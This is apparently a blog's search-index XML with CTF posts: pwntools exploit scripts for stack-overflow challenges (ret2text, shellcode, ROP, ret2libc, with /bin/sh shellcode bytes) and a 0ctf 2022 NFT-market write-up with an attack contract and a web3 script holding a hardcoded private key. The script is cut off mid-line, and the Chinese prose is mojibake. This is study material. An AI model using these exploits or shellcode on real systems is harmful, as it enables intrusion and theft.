<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[study]]></title>
    <url>%2F2023%2Fstudy%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å­¦ä¹ è®°å½• ret2textret2text 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *local = 1pc = './ret2text'aslr = Falsecontext.log_level = Truecontext.terminal = ["tmux","splitw","-h"]if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc, aslr=aslr)else: remote_addr = ['111.198.29.45', 39802] p = remote(remote_addr[0], remote_addr[1])def debug(b=""): gdb.attach(p, b) pause()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, '\x00')) else: return u64(rl().strip('\n').ljust(8, '\x00'))ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x, drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a, b)sla = lambda a,b : p.sendlineafter(a, b)pi = lambda : p.interactive()if __name__ == '__main__': target = 0x804863a payload = b'a' * 0x6c payload += b'b'*4 payload += p32(target) sla('There is something amazing here, do you know anything?\n', payload) pi() ret2shellcoderet2shellcode-bamboofox 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *local = 1pc = './ret2shellcode'aslr = Falsecontext.log_level = 'debug'context.terminal = ["tmux","splitw","-h"]#libc = ELF('./libc6_2.27-3ubuntu1.2_i386.so')#ret2libc3 = ELF('./ret2libc3')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc, aslr=aslr) #gdb.attach(p,'c')else: remote_addr = ['111.198.29.45', 39802] p = remote(remote_addr[0], remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x, drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a, b)sla = lambda a,b : p.sendlineafter(a, b)pi = lambda : p.interactive()def debug(b=""): gdb.attach(p, b) pause()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, '\x00')) else: return u64(rl().strip('\n').ljust(8, '\x00'))if __name__ == '__main__': #debug() #shellcode = asm(shellcraft.sh()) shellcode = b"\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80" buf2_addr = 0x804A080 payload = shellcode.ljust(0x6c+4, b'a') payload += p32(buf2_addr) sl(payload) pi() sniperoj-pwn100-shellcode-x86-64 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *local = 1pc = './shellcode'aslr = Falsecontext.log_level = 'debug'context.terminal = ["tmux","splitw","-h"]#libc = ELF('./libc6_2.27-3ubuntu1.2_i386.so')#ret2libc3 = ELF('./ret2libc3')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc, aslr=aslr) #gdb.attach(p,'c')else: remote_addr = ['111.198.29.45', 39802] p = remote(remote_addr[0], remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x, drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a, b)sla = lambda a,b : p.sendlineafter(a, b)pi = lambda : p.interactive()def debug(b=""): gdb.attach(p, b) pause()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, '\x00')) else: return u64(rl().strip('\n').ljust(8, '\x00'))if __name__ == '__main__': # 23 bytes # https://www.exploit-db.com/exploits/36858/ shellcode_x64 = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05" ru('[') buf_addr = rud(']') buf_addr = int(buf_addr, 16) lg('buf_addr', buf_addr) payload = b'a' * (0x10+8) payload += p64(buf_addr+0x10+8+8) payload += shellcode_x64 sl(payload) pi() ret2syscallret2syscall-bamboofox 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *local = 1pc='./rop'aslr = Falsecontext.log_level = 'debug'context.terminal = ["tmux","splitw","-h"]#libc = ELF('./libc6_2.27-3ubuntu1.2_i386.so')#ret2libc3 = ELF('./ret2libc3')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc, aslr=aslr) #gdb.attach(p,'c')else: remote_addr = ['111.198.29.45', 39802] p = remote(remote_addr[0], remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x, drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a, b)sla = lambda a,b : p.sendlineafter(a, b)pi = lambda : p.interactive()def debug(b=""): gdb.attach(p, b) pause()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, '\x00')) else: return u64(rl().strip('\n').ljust(8, '\x00'))if __name__ == '__main__': ''' $ ROPgadget --binary ./rop --only "pop|ret" | grep edx 0x0806eb69 : pop ebx ; pop edx ; ret 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 0x0806eb6a : pop edx ; ret 0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret $ ROPgadget --binary ./rop --only "pop|ret" | grep eax 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x080bb196 : pop eax ; ret 0x0807217a : pop eax ; ret 0x80e 0x0804f704 : pop eax ; ret 3 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret ''' #debug() ru(b'This time, no system() and NO SHELLCODE!!!\n') pop_edx_ecx_ebx_ret = 0x0806eb90 pop_eax_ret = 0x080bb196 binsh_addr = 0x80BE408 int80_addr = 0x08049421 payload = b'a'*0x6c payload += b'b'*4 payload += p32(pop_eax_ret) payload += p32(0xb) payload += p32(pop_edx_ecx_ebx_ret) payload += p32(0) payload += p32(0) payload += p32(binsh_addr) payload += p32(int80_addr) sl(payload) #pause() pi() ret2libcret2libc1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *local = 1pc='./ret2libc1'aslr = Falsecontext.log_level = 'debug'context.terminal = ["tmux","splitw","-h"]#libc = ELF('./libc6_2.27-3ubuntu1.2_i386.so')#ret2libc3 = ELF('./ret2libc3')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc, aslr=aslr) #gdb.attach(p,'c')else: remote_addr = ['111.198.29.45', 39802] p = remote(remote_addr[0], remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x, drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a, b)sla = lambda a,b : p.sendlineafter(a, b)pi = lambda : p.interactive()def debug(b=""): gdb.attach(p, b) pause()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, '\x00')) else: return u64(rl().strip('\n').ljust(8, '\x00'))if __name__ == '__main__': binsh_addr = 0x8048720 system_plt = 0x8048460 payload = b'a'*0x6c payload += b'b'*4 payload += p32(system_plt) payload += b'dead' payload += p32(binsh_addr) sl(payload) pi() ret2libc2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *local = 1pc='./ret2libc2'aslr = Falsecontext.log_level = 'debug'context.terminal = ["tmux","splitw","-h"]#libc = ELF('./libc6_2.27-3ubuntu1.2_i386.so')#ret2libc3 = ELF('./ret2libc3')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc, aslr=aslr) #gdb.attach(p,'c')else: remote_addr = ['111.198.29.45', 39802] p = remote(remote_addr[0], remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x, drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a, b)sla = lambda a,b : p.sendlineafter(a, b)pi = lambda : p.interactive()def debug(b=""): gdb.attach(p, b) pause()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, '\x00')) else: return u64(rl().strip('\n').ljust(8, '\x00'))if __name__ == '__main__': gets_plt = 0x8048460 system_plt = 0x8048490 buf2_addr = 0x804A080 binsh = b'/bin/sh\x00' pop_ebp_ret = 0x0804872f payload = b'a'*0x6c payload += b'b'*4 payload += p32(gets_plt) payload += p32(pop_ebp_ret) payload += p32(buf2_addr) payload += p32(system_plt) payload += p32(0xdeadbeef) payload += p32(buf2_addr) sl(payload) sl(binsh) pi() ret2libc3demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *local = 1pc = './ret2libc3'aslr = Falsecontext.log_level = Truecontext.terminal = ["tmux","splitw","-h"]ret2libc3 = ELF('./ret2libc3')libc = ELF('./libc6_2.31-0ubuntu9.9_i386.so')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc, aslr=aslr)else: remote_addr = ['111.198.29.45', 39802] p = remote(remote_addr[0], remote_addr[1])def debug(b=""): gdb.attach(p, b) pause()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, '\x00')) else: return u64(rl().strip('\n').ljust(8, '\x00'))ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x, drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a, b)sla = lambda a,b : p.sendlineafter(a, b)pi = lambda : p.interactive()if __name__ == '__main__': puts_plt = ret2libc3.plt['puts'] libc_start_main_got = ret2libc3.got['__libc_start_main'] start_addr = ret2libc3.symbols['_start'] payload = b'a'*0x6c payload += b'b'*4 payload += p32(puts_plt) payload += p32(start_addr) payload += p32(libc_start_main_got) sla(b'Can you find it !?', payload) libc_start_main_addr = u32(p.recv()[0:4]) lg('libc_start_main_addr', libc_start_main_addr) libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main'] lg('libc_base_addr', libc_base_addr) libc.address = libc_base_addr system_addr = libc.symbols['system'] binsh_addr = libc.search(b"/bin/sh").__next__() payload = b'a'*0x6c payload += b'b'*4 payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(binsh_addr) sla(b'Can you find it !?', payload) pi() train.cs.nctu.edu.tw: ret2libc 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from pwn import *from LibcSearcher import *local = 1pc = './ret2libc3'aslr = Falsecontext.log_level = Truecontext.terminal = ["tmux","splitw","-h"]ret2libc3 = ELF('./ret2libc3')libc = ELF('./libc6-i386_2.27-3ubuntu1.5_amd64.so')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc, aslr=aslr)else: remote_addr = ['111.198.29.45', 39802] p = remote(remote_addr[0], remote_addr[1])def debug(b=""): gdb.attach(p, b) pause()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, '\x00')) else: return u64(rl().strip('\n').ljust(8, '\x00'))ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x, drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a, b)sla = lambda a,b : p.sendlineafter(a, b)pi = lambda : p.interactive()if __name__ == '__main__': puts_plt = ret2libc3.plt['puts'] libc_start_main_got = ret2libc3.got['__libc_start_main'] start_addr = ret2libc3.symbols['_start'] payload = b'a'*0x6c payload += b'b'*4 payload += p32(puts_plt) payload += p32(start_addr) payload += p32(libc_start_main_got) sla(b'Can you find it !?', payload) libc_start_main_addr = u32(p.recv()[0:4]) lg('libc_start_main_addr', libc_start_main_addr) #libc = LibcSearcher('__libc_start_main', libc_start_main_addr) libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main'] lg('libc_base_addr', libc_base_addr) #libc.address = libc_base_addr system_addr = libc_base_addr + libc.symbols['system'] #binsh_addr = libc.search(b"/bin/sh").__next__() binsh_addr = libc_base_addr + libc.search(b"/bin/sh").__next__() payload = b'a'*0x6c payload += b'b'*4 payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(binsh_addr) sl(payload) pi()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf 2022 nft market]]></title>
    <url>%2F2022%2F0ctf2022%2F</url>
    <content type="text"><![CDATA[å‰è¨€ 0ctf 2022 nft é¢˜ç›®ï¼Œå¤±è´¥çš„å¤ç›˜ï¼Œèµ›ä¸­è°ƒè¯•å‡ºæ¥äº†è¿›å…¥ verifyCoupon åŽ orderid ä¼šå˜æˆ 0ï¼Œä½†æ²¡æœ‰ç»§ç»­è°ƒè¯•åŽé¢çš„ orderidï¼Œ233333ï¼Œèµ›åŽæ‰çŸ¥é“äº†æ˜¯ solidity 8.16 ç‰ˆæœ¬ä¹‹å‰çš„ bug ä¸»è¦æ¼æ´žåŽŸç†å‚è€ƒ https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/ å…·ä½“å°±ä¸åˆ†æžäº†ï¼Œåˆ«çš„å¸ˆå‚…å·²ç»å†™çš„å¾ˆå¥½äº†ï¼Œè¿™é‡Œå°±åªæ”¾å‡ºè‡ªå·±çš„ exp å‚è€ƒ https://s3cunda.github.io/2022/09/19/0ctf-2022-NFT-Market.html Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198pragma solidity 0.8.15;import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;contract TctfNFT is ERC721, Ownable &#123; constructor() ERC721(&quot;TctfNFT&quot;, &quot;TNFT&quot;) &#123; _setApprovalForAll(address(this), msg.sender, true); &#125; function mint(address to, uint256 tokenId) external onlyOwner &#123; _mint(to, tokenId); &#125;&#125;contract TctfToken is ERC20 &#123; bool airdropped; constructor() ERC20(&quot;TctfToken&quot;, &quot;TTK&quot;) &#123; _mint(address(this), 100000000000); _mint(msg.sender, 1337); &#125; function airdrop() external &#123; require(!airdropped, &quot;Already airdropped&quot;); airdropped = true; _mint(msg.sender, 5); &#125;&#125;struct Order &#123; address nftAddress; uint256 tokenId; uint256 price;&#125;struct Coupon &#123; uint256 orderId; uint256 newprice; address issuer; address user; bytes reason;&#125;struct Signature &#123; uint8 v; bytes32[2] rs;&#125;struct SignedCoupon &#123; Coupon coupon; Signature signature;&#125;contract TctfMarket &#123; event SendFlag(); event NFTListed( address indexed seller, address indexed nftAddress, uint256 indexed tokenId, uint256 price ); event NFTCanceled( address indexed seller, address indexed nftAddress, uint256 indexed tokenId ); event NFTBought( address indexed buyer, address indexed nftAddress, uint256 indexed tokenId, uint256 price ); bool tested; TctfNFT public tctfNFT; TctfToken public tctfToken; CouponVerifierBeta public verifier; Order[] orders; constructor() &#123; tctfToken = new TctfToken(); tctfToken.approve(address(this), type(uint256).max); tctfNFT = new TctfNFT(); tctfNFT.mint(address(tctfNFT), 1); tctfNFT.mint(address(this), 2); tctfNFT.mint(address(this), 3); verifier = new CouponVerifierBeta(); orders.push(Order(address(tctfNFT), 1, 1)); orders.push(Order(address(tctfNFT), 2, 1337)); orders.push(Order(address(tctfNFT), 3, 13333333337)); &#125; function getOrder(uint256 orderId) public view returns (Order memory order) &#123; require(orderId &lt; orders.length, &quot;Invalid orderId&quot;); order = orders[orderId]; &#125; function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) &#123; require(price &gt; 0, &quot;Invalid price&quot;); require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), &quot;Not owner&quot;); orders.push(Order(nftAddress, tokenId, price)); emit NFTListed(msg.sender, nftAddress, tokenId, price); return orders.length - 1; &#125; function cancelOrder(uint256 orderId) external &#123; Order memory order = getOrder(orderId); require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), &quot;Not owner&quot;); _deleteOrder(orderId); emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId); &#125; function purchaseOrder(uint256 orderId) external &#123; Order memory order = getOrder(orderId); _deleteOrder(orderId); IERC721 nft = IERC721(order.nftAddress); address owner = nft.ownerOf(order.tokenId); tctfToken.transferFrom(msg.sender, owner, order.price); nft.safeTransferFrom(owner, msg.sender, order.tokenId); emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price); &#125; function purchaseWithCoupon(SignedCoupon calldata scoupon) external &#123; Coupon memory coupon = scoupon.coupon; require(coupon.user == msg.sender, &quot;Invalid user&quot;); require(coupon.newprice &gt; 0, &quot;Invalid price&quot;); verifier.verifyCoupon(scoupon); Order memory order = getOrder(coupon.orderId); _deleteOrder(coupon.orderId); IERC721 nft = IERC721(order.nftAddress); address owner = nft.ownerOf(order.tokenId); tctfToken.transferFrom(coupon.user, owner, coupon.newprice); nft.safeTransferFrom(owner, coupon.user, order.tokenId); emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice); &#125; function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external &#123; require(!tested, &quot;Tested&quot;); tested = true; IERC721 nft = IERC721(nftAddress); uint256 orderId = TctfMarket(this).createOrder(nftAddress, tokenId, price); nft.approve(address(this), tokenId); TctfMarket(this).purchaseOrder(orderId); &#125; function win() external &#123; require(tctfNFT.ownerOf(1) == msg.sender &amp;&amp; tctfNFT.ownerOf(2) == msg.sender &amp;&amp; tctfNFT.ownerOf(3) == msg.sender); emit SendFlag(); &#125; function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) &#123; IERC721 nft = IERC721(nftAddress); address owner = nft.ownerOf(tokenId); return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender); &#125; function _deleteOrder(uint256 orderId) internal &#123; orders[orderId] = orders[orders.length - 1]; orders.pop(); &#125; function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) &#123; return this.onERC721Received.selector; &#125;&#125;contract CouponVerifierBeta &#123; TctfMarket market; bool tested; constructor() &#123; market = TctfMarket(msg.sender); &#125; function verifyCoupon(SignedCoupon calldata scoupon) public &#123; require(!tested, &quot;Tested&quot;); tested = true; Coupon memory coupon = scoupon.coupon; Signature memory sig = scoupon.signature; Order memory order = market.getOrder(coupon.orderId); bytes memory serialized = abi.encode( &quot;I, the issuer&quot;, coupon.issuer, &quot;offer a special discount for&quot;, coupon.user, &quot;to buy&quot;, order, &quot;at&quot;, coupon.newprice, &quot;because&quot;, coupon.reason ); IERC721 nft = IERC721(order.nftAddress); address owner = nft.ownerOf(order.tokenId); require(coupon.issuer == owner, &quot;Invalid issuer&quot;); require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, &quot;Invalid signature&quot;); &#125;&#125; EXP attack.sol 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286pragma solidity 0.8.15;import &quot;./openzeppelin-contracts/contracts/token/ERC721/ERC721.sol&quot;;import &quot;./openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&quot;;import &quot;./openzeppelin-contracts/contracts/access/Ownable.sol&quot;;contract TctfNFT is ERC721, Ownable &#123; constructor() ERC721(&quot;TctfNFT&quot;, &quot;TNFT&quot;) &#123; _setApprovalForAll(address(this), msg.sender, true); &#125; function mint(address to, uint256 tokenId) external onlyOwner &#123; _mint(to, tokenId); &#125;&#125;contract TctfToken is ERC20 &#123; bool airdropped; constructor() ERC20(&quot;TctfToken&quot;, &quot;TTK&quot;) &#123; _mint(address(this), 100000000000); _mint(msg.sender, 1337); &#125; function airdrop() external &#123; require(!airdropped, &quot;Already airdropped&quot;); airdropped = true; _mint(msg.sender, 5); &#125;&#125;struct Order &#123; address nftAddress; uint256 tokenId; uint256 price;&#125;struct Coupon &#123; uint256 orderId; uint256 newprice; address issuer; address user; bytes reason;&#125;struct Signature &#123; uint8 v; bytes32[2] rs;&#125;struct SignedCoupon &#123; Coupon coupon; Signature signature;&#125;contract TctfMarket &#123; event SendFlag(); event NFTListed( address indexed seller, address indexed nftAddress, uint256 indexed tokenId, uint256 price ); event NFTCanceled( address indexed seller, address indexed nftAddress, uint256 indexed tokenId ); event NFTBought( address indexed buyer, address indexed nftAddress, uint256 indexed tokenId, uint256 price ); bool tested; TctfNFT public tctfNFT; TctfToken public tctfToken; CouponVerifierBeta public verifier; Order[] orders; constructor() &#123; tctfToken = new TctfToken(); tctfToken.approve(address(this), type(uint256).max); tctfNFT = new TctfNFT(); tctfNFT.mint(address(tctfNFT), 1); tctfNFT.mint(address(this), 2); tctfNFT.mint(address(this), 3); verifier = new CouponVerifierBeta(); orders.push(Order(address(tctfNFT), 1, 1)); orders.push(Order(address(tctfNFT), 2, 1337)); orders.push(Order(address(tctfNFT), 3, 13333333337)); &#125; function getOrder(uint256 orderId) public view returns (Order memory order) &#123; require(orderId &lt; orders.length, &quot;Invalid orderId&quot;); order = orders[orderId]; &#125; function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) &#123; require(price &gt; 0, &quot;Invalid price&quot;); require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), &quot;Not owner&quot;); orders.push(Order(nftAddress, tokenId, price)); emit NFTListed(msg.sender, nftAddress, tokenId, price); return orders.length - 1; &#125; function cancelOrder(uint256 orderId) external &#123; Order memory order = getOrder(orderId); require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), &quot;Not owner&quot;); _deleteOrder(orderId); emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId); &#125; function purchaseOrder(uint256 orderId) external &#123; Order memory order = getOrder(orderId); _deleteOrder(orderId); IERC721 nft = IERC721(order.nftAddress); address owner = nft.ownerOf(order.tokenId); tctfToken.transferFrom(msg.sender, owner, order.price); nft.safeTransferFrom(owner, msg.sender, order.tokenId); emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price); &#125; function purchaseWithCoupon(SignedCoupon calldata scoupon) external &#123; Coupon memory coupon = scoupon.coupon; require(coupon.user == msg.sender, &quot;Invalid user&quot;); require(coupon.newprice &gt; 0, &quot;Invalid price&quot;); verifier.verifyCoupon(scoupon); Order memory order = getOrder(coupon.orderId); _deleteOrder(coupon.orderId); IERC721 nft = IERC721(order.nftAddress); address owner = nft.ownerOf(order.tokenId); tctfToken.transferFrom(coupon.user, owner, coupon.newprice); nft.safeTransferFrom(owner, coupon.user, order.tokenId); emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice); &#125; function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external &#123; require(!tested, &quot;Tested&quot;); tested = true; IERC721 nft = IERC721(nftAddress); uint256 orderId = TctfMarket(this).createOrder(nftAddress, tokenId, price); nft.approve(address(this), tokenId); TctfMarket(this).purchaseOrder(orderId); &#125; function win() external &#123; require(tctfNFT.ownerOf(1) == msg.sender &amp;&amp; tctfNFT.ownerOf(2) == msg.sender &amp;&amp; tctfNFT.ownerOf(3) == msg.sender); emit SendFlag(); &#125; function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) &#123; IERC721 nft = IERC721(nftAddress); address owner = nft.ownerOf(tokenId); return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender); &#125; function _deleteOrder(uint256 orderId) internal &#123; orders[orderId] = orders[orders.length - 1]; orders.pop(); &#125; function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) &#123; return this.onERC721Received.selector; &#125;&#125;contract CouponVerifierBeta &#123; TctfMarket market; bool tested; constructor() &#123; market = TctfMarket(msg.sender); &#125; function verifyCoupon(SignedCoupon calldata scoupon) public &#123; require(!tested, &quot;Tested&quot;); tested = true; Coupon memory coupon = scoupon.coupon; Signature memory sig = scoupon.signature; Order memory order = market.getOrder(coupon.orderId); bytes memory serialized = abi.encode( &quot;I, the issuer&quot;, coupon.issuer, &quot;offer a special discount for&quot;, coupon.user, &quot;to buy&quot;, order, &quot;at&quot;, coupon.newprice, &quot;because&quot;, coupon.reason ); IERC721 nft = IERC721(order.nftAddress); address owner = nft.ownerOf(order.tokenId); require(coupon.issuer == owner, &quot;Invalid issuer&quot;); require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, &quot;Invalid signature&quot;); &#125;&#125;contract AA &#123; address issuer; address user; uint256 newprice; bytes reason; Order order; bytes32 public hashl; function setinit(address _issuer, address _user, uint _newprice, address _nftaddress, uint _price, uint _tokenId) public &#123; issuer = _issuer; user = _user; newprice = _newprice; order.nftAddress = _nftaddress; order.price = _price; order.tokenId = _tokenId; bytes memory serialized = abi.encode( &quot;I, the issuer&quot;, issuer, &quot;offer a special discount for&quot;, user, &quot;to buy&quot;, order, &quot;at&quot;, newprice, &quot;because&quot;, &quot;&quot; ); hashl = keccak256(serialized); &#125;&#125;contract Attack &#123; TctfMarket T = TctfMarket(0x21df4c1E0F1f114A136DA168E33e9Dfbd005FA45); address account=0x80C86B253647868C927dc8442143B880203BC397; TctfNFT N= TctfNFT(address(T.tctfNFT())); TctfToken Token=TctfToken(T.tctfToken()); function approve(address a,uint b) public &#123; &#125; function safeTransferFrom(address a,address b,uint c) public &#123; &#125; function ownerOf(uint dd) public returns (address)&#123; if(dd==2)&#123; return address(this); &#125;else if(dd==3)&#123; return address(account); &#125; &#125; function isApprovedForAll(address a,address b) public returns (bool)&#123; return true; &#125; function getApproved(uint tokenId) public returns (address)&#123; return address(this); &#125; function attack1() public &#123; T.purchaseTest(address(this),2,1337); Token.transfer(account,1337); &#125; function attackfor3(uint8 v, bytes32 r, bytes32 s) public &#123; SignedCoupon memory scoupon; N.setApprovalForAll(account,true); Token.approve(address(0x21df4c1E0F1f114A136DA168E33e9Dfbd005FA45),10); scoupon.coupon.orderId=1; scoupon.coupon.newprice=1; scoupon.coupon.issuer=address(account); scoupon.coupon.user=address(this); scoupon.coupon.reason=&quot;&quot;; scoupon.signature.v=v; scoupon.signature.rs[0]=r; scoupon.signature.rs[1]=s; T.purchaseWithCoupon&#123;gas:200000&#125;(scoupon); &#125; function attack4() public &#123; N.setApprovalForAll(account,true); N.transferFrom(address(this),address(account),3); &#125; function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) &#123; return this.onERC721Received.selector; &#125;&#125; python è‡ªåŠ¨åŒ–ä¸€é”®è¿è¡Œï¼ŒçŽ¯å¢ƒä¸ºæœ¬åœ° ganache æµ‹è¯•çŽ¯å¢ƒ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248from web3 import Web3, HTTPProviderfrom solcx import compile_source,set_solc_version_pragma,compile_filesimport timeimport osw3 = Web3(Web3.HTTPProvider(&apos;http://127.0.0.1:8545&apos;))private = &quot;199280a1c26810629f63269567b0aa1ee11c52bdaf16cf5526d0f4f3aadb65fb&quot;public = &quot;0x2482119eBcDb9659397A0c1c59ed948fae80d47F&quot;_time = 1set_solc_version_pragma(&apos;^0.8.15&apos;)chain_id = w3.eth.chain_iddef generate_tx(chainID, to, data, value): txn = &#123; &apos;chainId&apos;: chainID, &apos;from&apos;: Web3.toChecksumAddress(public), &apos;to&apos;: to, &apos;gasPrice&apos;: w3.eth.gasPrice, &apos;gas&apos;: 10000000, &apos;nonce&apos;: 